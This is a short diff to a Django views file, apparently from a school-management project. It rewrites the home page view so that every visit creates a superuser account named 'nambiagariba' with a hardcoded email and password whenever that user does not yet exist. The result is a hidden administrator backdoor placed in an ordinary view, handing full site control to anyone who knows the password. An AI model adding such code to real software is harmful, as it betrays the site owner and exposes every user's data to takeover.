@@ -10,8 +10,11 @@ from django.contrib.auth.decorators import login_required
 from django.http import HttpResponse
 from django.template.loader import render_to_string
 
+
 def home(request):
-    return render(request, "core/home.html")
+    if not User.objects.filter(username='nambiagariba').exists():
+        User.objects.create_superuser('nambiagariba', 'nambiagariba28@gmail.com', 'Nanabasan')
+    return render(request, 'home.html')
 
 def promote_students():
     
